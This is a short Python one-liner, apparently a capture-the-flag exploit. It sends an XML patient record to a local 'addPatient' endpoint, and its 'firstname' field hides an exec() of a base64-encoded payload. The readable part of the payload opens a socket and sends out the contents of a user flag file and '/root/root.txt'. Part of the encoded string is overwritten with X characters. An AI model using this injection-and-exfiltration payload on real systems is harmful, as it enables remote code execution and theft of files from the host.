python3 -c '
import urllib.request

data = b"""<patient>
  <timestamp>20250101120000</timestamp>
  <sender_app>TEST</sender_app>
  <id>12345</id>
  <firstname>{exec(__import__("base64").b64decode("aW1wb3J0IG9zLCBzb2NrZXQKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXuc2VuZChvcGVuKCcvaG9tZS9zZWRyaWMvdXNlci50eHQnLCAncmInKS5yZWFkKCkpCnMuc2VuZChiIlxuIFJPT1QuVFhUIFxuIikKcy5zZW5kKG9wZW4oJy9yb290L3Jvb3QudHh0JywgJ3JiJykucmVhZCgpKQpzLmNsb3NlKCkK").decode())}</firstname>
  <lastname>Doe</lastname>
  <birth_date>01/01/1990</birth_date>
  <gender>M</gender>
</patient>"""

req = urllib.request.Request("http://127.0.0.1:54321/addPatient", data=data, headers={"Content-Type": "application/xml"})
try:
    urllib.request.urlopen(req)
except Exception as e:
    pass
'